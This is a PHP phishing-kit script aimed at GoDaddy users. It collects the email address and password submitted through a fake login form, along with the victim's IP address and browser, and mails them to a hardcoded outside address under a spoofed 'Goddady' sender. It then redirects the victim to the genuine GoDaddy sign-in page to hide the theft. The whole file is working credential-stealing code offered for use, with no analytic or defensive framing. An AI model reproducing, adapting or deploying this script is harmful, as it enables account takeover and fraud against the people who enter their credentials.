<?
$ip = getenv("REMOTE_ADDR");
session_start();
$username = $_POST['EmailAdd'];
$password = $_POST['Password'];
$datamasii=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------Spam ReSulT--------------------n
Email ID : $username
Passwdord: $password
-------------------------------------------------------------n
Date     : $datamasii
Browser  : $browser
IP       : $ip
-----------------Spam ReSulT-----------------------------------n";
$send = "corina120arms@yahoo.com";
$subject = "New Godaddy Login $ip";
$headers = "From: Goddady<margo.fdie@edu.uk>";
$headers .= $_POST['eMailAdd']."n";
$headers .= "MIME-Version: 1.0n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://sso.godaddy.com/?app=email&realm=pass";

</script>